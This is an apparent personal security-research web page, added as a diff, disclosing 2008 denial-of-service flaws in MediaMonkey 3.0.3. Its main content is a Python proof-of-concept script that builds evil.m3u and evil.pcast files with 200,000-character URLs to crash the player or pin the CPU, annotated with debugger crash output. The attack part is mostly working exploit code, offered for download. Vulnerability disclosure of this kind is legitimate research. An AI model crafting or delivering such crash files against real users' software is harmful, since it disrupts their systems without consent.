@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="Shinnok at localhost."/>
+<meta name="keywords" content="shinnok, exploits, vulnerabilities, buffer overflow, cyber-security, unix, linux, open-source, c++, Qt, programming, cross-platform"/>
+<meta name="author" content="Shinnok"/>
+<link rel="icon" href="/img/shinnok.png" type="image/png" />
+<link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+<title>Shinnok @127.0.0.1</title>
+</head>
+
+<body>
+<div class="main">
+<div id="header">
+        <div id="gfx">
+            <div id="hexdump">
+                <script>
+                 var p=0,q=-12;function a(){if(window.setTimeout&&document.getElementsByTagName){var o=(2<<6);var b=document.getElementsByTagName("pre")[0];b.style.top=(p-o)+"pt";var l=document.getElementsByTagName("b");var o=-(p-o)+"pt";for(var a in l){if(l[a].style)l[a].style.top=o;}p+=q;if(p<-2<<9||p>=0)q=-q;window.setTimeout(this.a,2<<8);}};
+
+                var xhr = new XMLHttpRequest();
+                xhr.onreadystatechange = function() {
+                  if (xhr.readyState === 4 && xhr.status === 200) {
+                    document.getElementById("hexdump").innerHTML = xhr.responseText;
+                    a();
+                  }
+                };
+                xhr.open("GET", "/hexdump.html", true);
+                xhr.send();
+                </script>
+            </div>
+
+            <div id="logo"><h1><a href="#">Shinnok @127.0.0.1</a></h1></div>
+            <div class="quote" id="head-quote"><h4><a href="/">When in doubt, use brute force</a></h4></div>
+        </div>
+        <div class="menu">
+                <a href="/"><center><span>Home</span></center></a>
+                <a href="/rants/"><center><span>Rants</span></center></a>
+                <a href="/vulns/"><center><span>Vulns/Exploits</span></center></a>
+                <a href="/projects/"><center><span>Projects</span></center></a>
+                <a href="/stuff/"><center><span>Stuff</span></center></a>
+                <a href="/about/" id="last"><center><span>About</span></center></a>
+        </div>
+</div> <!--header-->
+
+<div class="content">
+
+        <div class="item">
+            <h1>[2008-07-16] MediaMonkey URI Handling Multiple Denial of Service Vulnerabilities </h1>
+        </div>
+        <div class="item">
+            <h1>Description</h1>
+            <p>MediaMonkey is prone to two denial-of-service vulnerabilities because it fails to handle user-supplied input.The Vulnerability resides in failure to handle overly long urls in bot .m3u and .pcast files.</p>
+        </div>
+        <div class="item">
+            <h1>POC/Exploit code&nbsp;&nbsp;&nbsp;<a href="../vulns_code/mediamonkey.py">[.py]</a></h1>
+             <code>
+#!/usr/bin/python
+# MediaMonkey 3.0.3 [.m3u] &amp; [.pcast] url handling DOS
+#This script will generate 2 files called evil.m3u and evil.pcast.
+#In both cases the vulnerability resides in failure to handle overly long urls.
+#[.m3u descr]
+#The vulnerability exists in several places within the url.In this case
+#we are going to use the file name part of the url.
+#Open evil.m3u in MediaMonkey then play it.Or double click the .m3u file
+#and it will try to play automatically.
+#Debugger output on crash:
+#              ----------------------------------------------------------------
+#              Exception C0000005 (ACCESS_VIOLATION reading [31F518F0])
+#              ----------------------------------------------------------------
+#              EAX=FFFFFFFF: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+#              EBX=00000002: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+#              ECX=0CF203D9: 2F 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
+#              EDX=0CF203D9: 2F 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
+#              ESP=0CC5AF38: 31 32 37 2E 30 2E 30 2E-31 2F 41 41 41 41 41 41
+#              EBP=0CCBFF7C: B4 FF CB 0C 18 63 54 03-B8 49 55 03 08 3F 5B 03
+#              ESI=25031517: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+#              EDI=0CCBFF5D: 03 F2 0C D9 03 F2 0C 26-00 00 00 48 00 F1 0C 78
+#              EIP=035445A8: 8A 14 0E 8D 04 0E 80 FA-2F 0F 84 13 01 00 00 80
+#                            --&gt; MOV DL,[ESI+ECX*1]
+#              ----------------------------------------------------------------
+#
+#[.pcast descr]
+#Just as in the .m3u case the vulnerability manifests in several places within
+#the url.In this case we will use the filename too.
+#Double click or &quot;open with&quot; evil.pcast in MediaMonkey.The program will
+#start consuming 100% cpu thus becaming unusable.
+#
+#Found by Shinnok
+m3u = 'http://127.0.0.1/'
+badstr = 'A' * 200000
+m3u += badstr
+m3u += '.mp3'
+
+f = open('evil.m3u','wb')
+f.write(m3u);
+f.close
+
+pcast = '&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;pcast version=&quot;1.0&quot;&gt;\n&lt;channel&gt;\n&lt;link rel=&quot;feed&quot; type=\
+&quot;application/rss+xml&quot; href=&quot;http://127.0.0.1/'
+badstr = 'A'* 200000
+pcast += badstr
+pcast += '.xml&quot;/&gt;&lt;/link&gt;\n&lt;/channel&gt;\n&lt;/pcast&gt;\n'
+
+f = open('evil.pcast','wb')
+f.write(pcast);
+f.close
+</code>
+        </div>
+        <div class="item">
+            <h1>Other references</h1>
+                <p>Milw0rm : n/a</p>
+                <p>Securityfocus : <a href="http://www.securityfocus.com/bid/30251/info">http://www.securityfocus.com/bid/30251/info</a></p>
+        </div>
+
+</div>
+
+<div class="footer">&copy; copycats 1970 <a href="#">↥</a></div>
+</div> <!--main-->
+</body>
+</html>
+
